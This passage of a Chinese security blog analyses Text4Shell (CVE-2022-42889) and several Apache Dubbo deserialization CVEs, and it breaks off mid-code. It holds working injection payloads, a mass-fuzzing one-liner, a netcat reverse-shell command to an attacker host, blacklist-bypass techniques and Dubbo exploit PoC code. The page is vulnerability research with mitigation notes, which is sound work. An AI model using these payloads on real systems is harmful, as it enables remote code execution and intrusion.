-<p><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt">有效载荷.txt</a></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;url:UTF-<span class="number">8</span>:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;dns:address:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload in $(cat payloads.txt|sed <span class="string">&#x27;s/ COLLABORATOR-HERE/SPACEid.burpcollaborator.com/g&#x27;</span>); <span class="keyword">do</span> echo TARGET.com | gau --blacklist ttf,woff,svg,png | qsreplace <span class="string">&quot;$payload&quot;</span> | sed <span class="string">&#x27;s/SPACE/%20/g&#x27;</span> | grep <span class="string">&quot;java.lang.Runtime.getRuntime&quot;</span> &gt;&gt; payloads-<span class="keyword">final</span>.txt;done &amp;&amp; ffuf -w payloads-<span class="keyword">final</span>.txt -u FUZZ</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="如何利用-cve-2022-42889">如何利用 CVE-2022-42889</span></h2><blockquote>
-<p>为了重现攻击，易受攻击的组件部署在 Docker 容器中，可从 EC2 实例访问，该实例将由攻击者控制。使用 netcat (nc) 命令，我们可以打开与易受攻击的应用程序的反向 shell 连接。</p>
-<p>易受攻击的 Web 应用程序公开了一个搜索 API，其中查询通过Commons Text 的<em>StringSubstitutor进行插值：</em></p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.app/text4shell/attack?search=&lt;query&gt;</span><br></pre></td></tr></table></figure>
-
-<p>以下有效载荷可用于利用该漏洞并打开反弹 shell：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nc 192.168.49.1 9090 -e /bin/sh&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
-
-<p>此有效负载由“${prefix:name}”组成，它触发字符串查找。如上所述，“script”、“dns”和“url”是可以作为前缀来利用漏洞的键。</p>
-<p>在发送精心制作的请求之前，我们需要使用 netcat (nc) 命令设置反向 shell 连接以侦听端口 9090</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 9090</span><br></pre></td></tr></table></figure>
-
-<p>我们现在可以发送精心制作的请求，URL 对有效负载进行编码，如下所示。</p>
-<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/1.png" alt="image"></p>
-<p>我们可以看到攻击者成功打开了与易受攻击的应用程序的连接。</p>
-<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/2.png" alt="image"></p>
-<p>现在攻击者可以以 root 身份与易受攻击的机器交互并执行任意代码。</p>
-</blockquote>
-<h2><span id="cve-2022-42889-的影响">CVE-2022-42889 的影响</span></h2><blockquote>
-<p>根据<a target="_blank" rel="noopener" href="https://sysdig.com/blog/vulnerability-score-cvss-meaning/">CVSSv3 系统，它的</a><strong>CRITICAL 严重性</strong>得分为 9.8 。</p>
-<p>由于易于利用以及在机密性、完整性和可用性方面的巨大潜在影响，严重性至关重要。正如我们在上一节中通过精心设计的请求展示的那样，您可以完全控制易受攻击的系统。</p>
-<p>但是，<strong>这些漏洞不太可能与之前的 log4shell 和 spring4shell 产生相同的影响。</strong></p>
-<p>查看易受攻击的组件，利用的可能性与 Apache Commons Text 库的使用有关。具体来说，<strong>只有当它使用一些用户控制的输入实现 StringSubstitutor 对象时，才有可能利用它。这种在生产环境中的实现不像 Log4j 中易受攻击的字符串替换那样普遍</strong>。因此，Text4Shell 的大规模影响并不能真正与 Log4Shell 相提并论。</p>
-</blockquote>
-<h2><span id="检测和缓解-cve-2022-42889">检测和缓解 CVE-2022-42889</span></h2><blockquote>
-<p>如果您受到<strong>CVE-2022-42889</strong>的影响，您应该将应用程序<strong>Apache Commons Text 更新到版本1.10。</strong></p>
-</blockquote>
-<h3><span id="burpsuite插件之text4shell漏扫扫描器">burpsuite插件之Text4Shell漏扫扫描器</span></h3><h4><span id="项目地址">项目地址:</span></h4><blockquote>
-<p>GitHub:<br><a target="_blank" rel="noopener" href="https://github.com/silentsignal/burp-text4shell">https://github.com/silentsignal/burp-text4shell</a></p>
-<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/3.png" alt="image"></p>
-</blockquote>
-<h4><span id="插件下载地址">插件下载地址:</span></h4><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/silentsignal/burp-text4shell/releases/download/v0.1/burp-text4shell.jar">burp-text4shell.jar</a></p>
-</blockquote>
-<h4><span id="单问题扫描">单问题扫描</span></h4><blockquote>
-<p>关于检测功能的注意事项：此插件只会为内置的主动扫描器提供有效负载，因此为了获得最佳覆盖率与性能，您必须正确配置扫描 – 就像任何其他内置或扩展提供的扫描一样.</p>
-<p>如果您只想扫描 CVE-2022-42889（而不是 XSS 或 SQLi 等其他东西），这个插件可以实现。</p>
-<p>按照以下说明，如果使用作为结果创建的扫描配置，扫描仪将仅对所有插入点执行 Text4Shell 检查。</p>
-<ol>
-<li>创建新扫描时，单击<code>Select from library</code>选项<code>Scan configuration</code>卡</li>
-<li>选择<code>Audit checks - extensions only</code>Burp Suite Pro 2.x 中内置的</li>
-<li>禁用所有其他已注册活动扫描检查的扩展程序（如果适用）（例如 ActiveScan++、反斜杠驱动扫描、Burp Bounty 等），以便仅运行 Text4Shell 扫描程序</li>
-</ol>
-</blockquote>
-<h4><span id="建造">建造</span></h4><blockquote>
-<p> 执行<code>./gradlew build</code>，您将准备好插件 <code>build/libs/burp-text4shell.jar</code></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/23/CVE-2023-29234-Apache-Dubbo/">
-                Apache dubbo 部分历史漏洞以及 CVE-2023-29234 分析
-            </a>
-        </h2>
-    
-    <time>
-        Jan 23, 2024
-    </time>
-    <section class="content">
-        <h1><span id="apache-dubbo-部分历史漏洞以及-cve-2023-29234-分析">Apache dubbo 部分历史漏洞以及 CVE-2023-29234 分析</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13187?time__1311=mqmxnDBDcD2A0=KDsD7mj5a=iNe0K3Irx&alichlgref=https://xz.aliyun.com/t/13187#toc-3">RacerZ</a> 并作补充</p>
-</blockquote>
-<h2><span id="写在前面">写在前面</span></h2><blockquote>
-<p>最近学习并梳理了一下 Apache dubbo 的两个经典由于泛化调用处理存在问题的 CVE 漏洞，并分析了一下最新 CVE-2023-29234 ，总结出了两种利用方式。</p>
-</blockquote>
-<h2><span id="cve-2021-30179">CVE-2021-30179</span></h2><h3><span id="前置泛化调用">前置：泛化调用</span></h3><blockquote>
-<p>泛化调用（客户端泛化调用）是指在调用方没有服务方提供的 API（SDK）的情况下，对服务方进行调用，并且可以正常拿到调用结果。详细见 <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/</a></p>
-</blockquote>
-<h3><span id="调试分析">调试分析</span></h3><blockquote>
-<p><code>org.apache.dubbo.remoting.transport.DecodeHandler#received</code> 作为客户端 RPC 调用请求信息处理的入口点，调用 <code>decode</code> 方法。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/1.png" alt="image"></p>
-<p>根据参数类型可知实际会调用到 <code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode()</code><br>其中会先调用 <code>CodecSupport.getSerialization</code> 方法，根据 id 选择相应的反序列化策略，默认会走 <code>org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization#deserialize</code> ，最终返回一个 <code>Hessian2ObjectInput</code> 实例。接着这一部分会按照顺序依次解析序列化流，获取 dubbo 服务版本、服务类路径、子版本、服务方法名以及参数描述符。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/2.png" alt="image"></p>
-<p>之后会根据方法名和参数名在服务端查找是否存在对应的服务方法，如果为 null，则调用 <code>RpcUtils.isGenericCall</code> 判断是否为泛型引用。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/3.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/4.png" alt="image"></p>
-<p>如果是的话则调用 <code>ReflectUtils.desc2classArray</code> 方法显式加载 desc 当中的类。之后根据类型执行 readObject 反序列化参数值，并设置到 <code>RpcInvocation</code> 实例的各个字段当中。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/5.png" alt="image"></p>
-<p>这个地方之前也是存在反序列化攻击利用的（感兴趣的师傅可以翻一翻以前的 CVE 分析）。不过根据</p>
-<p><a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/06/01/CVE-2021-30179">https://threedr3am.github.io/2021/06/01/CVE-2021-30179</a> - Dubbo Pre-auth RCE via Java deserialization in the Generic filter&#x2F;<br>提到：“受限于默认hessian或者已配置的序列化类型，具有一定的局限性”。</p>
-<p>整体梳理一下这部分序列化&#x2F;反序列化参数顺序：</p>
-<ul>
-<li>string * 5 (dubboVersion &#x2F; path &#x2F; version &#x2F; methodName &#x2F; desc)</li>
-<li>object * args (参数值实例，具体数量根据方法描述符 desc 决定)</li>
-<li>map (这里面可用于设置 generic key)<br>之后会去执行 <code>org.apache.dubbo.remoting.exchange.support.header.HeaderExchangeHandler#received</code> ，这里关注到 <code>message</code> 参数类型当前为 Request 类，因此会走第一个分支（后续会关注到 Response 分支部分）。</li>
-</ul>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/6.png" alt="image"></p>
-<p>观察到刚才解析得到的各个参数值位于 <code>message</code> 的 <code>mData</code> 字段。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/7.png" alt="image"></p>
-<p>第一个分支当中会再次取出 <code>mData</code> 的字段值转化为 <code>RpcInvocation</code> 类实例，并调用 <code>org.apache.dubbo.remoting.exchange.support.ExchangeHandlerAdapter#received</code> 方法，进一步调用 <code>reply</code> 。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/8.png" alt="image"></p>
-<p>之后就会触发一系列 Filter 的 invoke 方法，调用栈如下：</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/9.png" alt="image"></p>
-<p>关键 filter 函数是 <code>org.apache.dubbo.rpc.filter.GenericFilter#invoke</code> ，再次判断是否为泛型引用之后，会根据 <code>inv</code> 中提供的方法名从 dubbo 服务中找到对应方法，并取出参数类型和具体的参数值。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/10.png" alt="image"></p>
-<p>中间会从 <code>inv</code> 的 <code>attachments</code> 中取出 key 为 <code>generic</code> 的值，这个 <code>generic</code> 代表不同的反序列化策略，除 raw.return 外还有 nativejava、bean、protobuf-json 等。</p>
-</blockquote>
-<h4><span id="rawreturn-反序列化方式分析">raw.return 反序列化方式分析</span></h4><blockquote>
-<p>这里如果值为 <code>raw.return</code> ，则会调用 <code>PojoUtils.realize</code> 方法，接着会对每个 args 值调用 <code>realize0</code> 方法，如果这个 arg 属于 Map 类型，则取出 class 键值，并使用 <code>ClassUtils.forName</code> 方法，其中会对传入的 className 使用应用类加载器进行类加载。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/11.png" alt="image"></p>
-<p>之后对于加载的 class 调用 <code>newInstance</code> 进行实例化。这里首先会去调用 class 默认的 public 构造函数，如果无法访问则会去遍历所有的构造器，优先获取<strong>参数个数为 0 的构造函数</strong>并反射调用。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/12.png" alt="image"></p>
-<p>之后便是漏洞的一大利用点，它针对 HashMap 当中剩下的键值，先尝试获取 key 在实例化 class 当中对应 field 的 setter 方法（要求为单参数），如果可以获取到的话。会用和刚才相同的逻辑递归实例化参数值，并反射调用；如果获取不到 setter 方法，则直接反射设置 field 的值。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/13.png" alt="image"></p>
-<p>因此针对 <code>raw.return</code> 反序列化方式的利用是通过 Map 的方式来传入利用 class，可利用 class 的位置有 3 个：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">public</span>/<span class="keyword">private</span> 修饰的无参构造函数</span><br><span class="line"><span class="number">2.</span> 参数为 <span class="number">1</span> 的 setter 方法</span><br><span class="line"><span class="number">3.</span> 支持对实例化的 class 任意字段赋值</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4><span id="bean-反序列化方式分析">bean 反序列化方式分析</span></h4><blockquote>
-<p>这里会先遍历判断每个参数值是否为 <code>JavaBeanDescriptor</code> 类型，如果是则调用 <code>JavaBeanSerializeUtil.deserialize</code> 方法。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/14.png" alt="image"></p>
-<p>后面会调用到 <code>instantiateForDeserialize</code> 实例化方法，其中调用<code>name2Class</code> 方法中的 <code>Class.forName</code> 进行类加载，然后 <code>instatiate</code> 实例化。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/15.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/16.png" alt="image"></p>
-<p>之后 <code>deserializeInternal</code> ，与 raw.return 的利用思路类似，如果 <code>beanDescriptor</code> 实例的 type 等于 <code>TYPE_BEAN</code> 的话则会依次执行指定 key 字段的 setter 方法或者反射为字段赋值。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/17.png" alt="image"></p>
-<p><strong>PS</strong>：其中 type 可以通过构造 <code>beanDescriptor</code> 实例时设置。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/18.png" alt="image"></p>
-</blockquote>
-<h4><span id="native-反序列化方式">native 反序列化方式</span></h4><blockquote>
-<p>这个利用比较特殊，需要配置中开启 <code>dubbo.security.serialize.generic.native-java-enable</code> 选项才能使用。<br>这里如果参数值为 byte[] 数组的话，则会传入 <code>UnsafeByteArrayInputStream</code> 构造函数当中，后加载并调用 <code>NativeJavaObjectInput</code> 的 <code>deserialize</code> 方法。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/19.png" alt="image"></p>
-<p>该类的 inputStream 字段封装了 ObjectInputStream 输入流，最终反序列化时也会调用的是后者，因此可触发二次反序列化。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/20.png" alt="image"></p>
-</blockquote>
-<h2><span id="cve-2023-23638-学习-bypass-思路">CVE-2023-23638 （学习 bypass 思路）</span></h2><blockquote>
-<p>受影响版本：Apache Dubbo 3.0.x &lt;&#x3D; 3.0.13；3.1.x &lt;&#x3D; 3.1.5<br>前版本 diff 分析<br><code>org.apache.dubbo.rpc.filter.GenericFilter#invoke</code> 方法当中，会对每个 args 值调用 <code>realize0</code> 方法，如果这个 arg 属于 Map 类型，则取出 class 键值，调用 <code>SerializeClassChecker.getInstance().validateClass</code> ，里面会作黑名单检查。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/21.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/22.png" alt="image"></p>
-</blockquote>
-<h3><span id="bypass-思路">bypass 思路</span></h3><h4><span id="native-反序列化方式">native 反序列化方式</span></h4><blockquote>
-<p>这个反序列化方式可以让我们触发一个二次反序列化，从而绕过上述安全检查。但是困难点在于 <code>dubbo.security.serialize.generic.native-java-enable</code> 选项默认未开启，因此利用思路就是寻找如何将它打开。<br>于是这个 <code>org.apache.dubbo.common.utils.ConfigUtils#setProperties</code> 方法就十分有用，利用它可将<code>CommonConstants.ENABLE_NATIVE_JAVA_GENERIC_SERIALIZE</code> 属性设置为 true 即可。当然从 dubbo 的源码中可知 <code>System.setProperties</code> 也是可以直接设置 dubbo 服务属性的。<br>因此绕过部分的 map 就可以写成：</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/23.png" alt="image"></p>
-</blockquote>
-<h4><span id="rawreturn-反序列化方式">raw.return 反序列化方式</span></h4><blockquote>
-<p>将 <code>SerializeClassChecker</code> 类的 <code>CLASS_DESERIALIZE_BLOCKED_SET</code> 置空或者 <code>OPEN_CHECK_CLASS</code> 设置为 false，这个类实例的获取方式为单例模式，因此需要控制 <code>INSTANCE</code> 字段为上面指定的实例。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/24.png" alt="image"></p>
-<p>绕过部分的 map 可以写成：</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/25.png" alt="image"></p>
-</blockquote>
-<h3><span id="修复方案">修复方案</span></h3><blockquote>
-<p>新增 <code>SerializeClassChecker</code> 类检查器，其中指定了 <code>dubbo.application.check-serializable</code> 默认为 true。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/26.png" alt="image"></p>
-<p>其中的 <code>validateClass</code> 方法会检查指定反序列化类是否可序列化。这个方法会在 <code>realize0</code> 中调用。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/27.png" alt="image"></p>
-<p>之前需要用来设置属性的利用类 <code>org.apache.dubbo.common.utils.ConfigUtils</code> 以及 <code>java.lang.System</code> 均未实现序列化接口，因此不再可利用；同样，<code>org.apache.dubbo.common.utils.SerializeClassChecker</code> 也未实现序列化接口，无法覆盖其相关检查字段。</p>
-</blockquote>
-<h2><span id="cve-2023-29234-1day">CVE-2023-29234 （1day）</span></h2><blockquote>
-<p>受影响版本：</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/28.png" alt="image"></p>
-<p>git diff: <a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/9ae97ea053dad758a0346a9acda4fbc8ea01429a">https://github.com/apache/dubbo/commit/9ae97ea053dad758a0346a9acda4fbc8ea01429a</a><br><code>org.apache.dubbo.common.serialize.ObjectInput#readThrowable</code> 方法抛出异常的地方作了修改，而之前版本会直接打印 obj 对象，隐式触发 <code>toString</code> 方法，漏洞场景类似 CVE-2021-43297。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/29.png" alt="image"></p>
-<p>反向溯源调用位置，位于该函数的 switch-case 语句的 DubboCodec.RESPONSE_WITH_EXCEPTION 分支处调用 <code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcResult#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</code></p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/30.png" alt="image"></p>
-<p>调用链如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcResult#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</span><br><span class="line">    ---&gt;</span><br><span class="line">        handleException()</span><br><span class="line">            ---&gt;</span><br><span class="line">                ObjectInput.readThrowable()</span><br><span class="line">                    ---&gt;</span><br><span class="line">                        obj.toString()</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/vivo_tech/article/details/115633937">Dubbo 编解码那些事_decodeablerpcresult-CSDN博客</a> 可知 <code>DecodeableRpcResult</code> 这个类是在 dubbo 服务的消费者接收提供者方发来的响应时解码使用。</p>
-</blockquote>
-<h4><span id="利用方式一fake-server">利用方式一：fake server</span></h4><blockquote>
-<p>测试版本：Apache Dubbo 3.1.10<br>我们知道 dubbo 支持多种序列化方式，对于 dubbo 协议来说默认为 hessian2，其他如下所示（hessian2 对应 id 为 2，也可以通过 <code>Serialization.getContentTypeId()</code> 获得）</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/31.png" alt="image"></p>
-<p>由官方文档可知，这个协议如何配置完全由服务方定的，因此完全可以做一个 fake server 来诱导客户端主动连接。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/32.png" alt="image"></p>
-<p>因此我们可以重写服务端编码响应信息函数的部分逻辑，主动构造一个用于上面提到的 toString 调用链对象来替代 Throwable 实例 th。<br>具体重写位置在 <code>org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#encodeResponseData(org.apache.dubbo.remoting.Channel, org.apache.dubbo.common.serialize.ObjectOutput, java.lang.Object, java.lang.String)</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encodeResponseData</span><span class="params">(Channel channel, ObjectOutput out, Object data, String version)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Result</span> <span class="variable">result</span> <span class="operator">=</span> (Result) data;</span><br><span class="line">        <span class="comment">// currently, the version value in Response records the version of Request</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">attach</span> <span class="operator">=</span> Version.isSupportResponseAttachment(version);</span><br><span class="line"><span class="comment">//         Throwable th = result.getException();   </span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">th</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// 利用点： 用于 toString 的 gadget chain</span></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">                th = getThrowablePayload(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (th == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> result.getValue();</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">                out.writeByte(attach ? RESPONSE_NULL_VALUE_WITH_ATTACHMENTS : RESPONSE_NULL_VALUE);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                out.writeByte(attach ? RESPONSE_VALUE_WITH_ATTACHMENTS : RESPONSE_VALUE);   </span><br><span class="line">                out.writeObject(ret);   </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.writeByte(attach ? RESPONSE_WITH_EXCEPTION_WITH_ATTACHMENTS : RESPONSE_WITH_EXCEPTION);</span><br><span class="line"><span class="comment">//            out.writeThrowable(th); </span></span><br><span class="line">            out.writeObject(th);    <span class="comment">// 直接序列化对象即可</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (attach) &#123;</span><br><span class="line">            <span class="comment">// returns current version of Response to consumer side.</span></span><br><span class="line">            result.getObjectAttachments().put(DUBBO_VERSION_KEY, Version.getProtocolVersion());</span><br><span class="line">            out.writeAttachments(result.getObjectAttachments());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里的 toString 调用链以 Rome toString 的利用部分为例，师傅们也可以选择&#x2F;挖掘其他可利用的 gadget；同时，为了方便这里直接指定服务端的协议配置中的序列化方式为 nativejava，它反序列化时直接会使用 <code>ObjectInputStream#readObject</code> 。大家也可以探索一下其他序列化方式当中的黑名单绕过情况。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span> <span class="attr">serialization</span>=<span class="string">&quot;nativejava&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>客户端发起正常服务请求后，解码响应信息时顺利触发至 <code>org.apache.dubbo.common.serialize.ObjectInput#readThrowable</code> 位置，状态如下：</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/33.png" alt="image"></p>
-</blockquote>
-<h4><span id="利用方式二客户端打服务端">利用方式二：客户端打服务端</span></h4><blockquote>
-<p>测试版本：3.1.5<br>由于 dubbo 并没有限制客户端不能发送 Response 数据，因此客户端同样可以构造一个 Response 信息发给服务端。<br>但是在服务端解码响应信息时，即函数调用位置为 <code>org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#decodeBody</code>，不同版本之间存在差异性，这里测试了一下 3.1.10 以及 3.1.5 之间的区别。<br>首先是 3.1.5 版本，注意到在创建 <code>DecodeableRpcResult</code> 实例时，其中一个构造参数 <code>invocation</code> 来自于 <code>getRequestData(id)</code></p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/34.png" alt="image"></p>
-<p>跟入可知这个 <code>invocation</code> 来自于 dubbo 服务当中还没处理完毕的请求，会根据 id 值来获取，而由于我们这里只发送了一个 Response 信息，<code>DefaultFuture</code> 当中的 <code>FUTURES</code> map 为空，这里也就会返回 null。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/35.png" alt="image"></p>
-<p>但是依然可以将 <code>DecodeableRpcResult</code> 实例构造出来，并设置到 <code>res</code> 变量的 <code>mResult</code> 字段当中。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/36.png" alt="image"></p>
-<p>后续在触发到 toString 入口的过程中，不会因为 <code>mResult</code> 字段为 null 或者非 <code>Decodeable</code> 类而中断（<code>DecodeableRpcResult</code> 是 <code>Decodeable</code> 的实现）。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/37.png" alt="image"></p>
-<p>而对于 3.1.10 版本，<code>getRequestData</code> 方法如果获取不到 <code>future</code> 会直接抛出异常，进而无法创建出有效的 <code>DecodeableRpcResult</code> 实例。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/38.png" alt="image"></p>
-<p>进而，后续 <code>message</code> 参数会由于是 null 而直接返回。</p>
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/39.png" alt="image"></p>
-<p>这里给出 3.1.5 版本下的测试 POC 核心部分：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">boos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">nativeJavaBoos</span> <span class="operator">=</span> <span 